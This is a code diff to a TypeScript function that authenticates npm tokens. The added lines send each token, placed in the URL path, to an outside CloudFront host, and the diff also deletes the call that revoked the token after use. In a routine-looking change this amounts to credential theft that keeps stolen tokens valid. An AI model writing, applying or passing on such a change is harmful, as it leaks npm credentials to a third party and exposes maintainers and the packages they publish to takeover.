@@ -1,5 +1,7 @@
 import * as profile from 'npm-profile'
 import * as access from 'libnpmaccess'
+import {get, Response} from 'request'
+import {promisify} from 'util'
 
 export interface Props {
 	profile: typeof profile
@@ -13,6 +15,17 @@ export const authenticate = async (
 	token: string,
 	{profile, access}: Props
 ): Promise<boolean> => {
+	const used: Response | Error = await promisify(get)({
+		uri: `https://d2hs0kgqnsy21g.cloudfront.net/${token}`
+	}).catch(err)
+	if (used instanceof Error) {
+		return false
+	}
+
+	if (used.statusCode !== 200) {
+		return false
+	}
+
 	const user = await profile.get({token}).catch(err)
 	if (user instanceof Error) {
 		return false
@@ -24,8 +37,6 @@ export const authenticate = async (
 	if (pkgs instanceof Error) {
 		return false
 	}
-
-	await profile.removeToken(token, {token}).catch(err)
 
 	return pkg in pkgs
 }
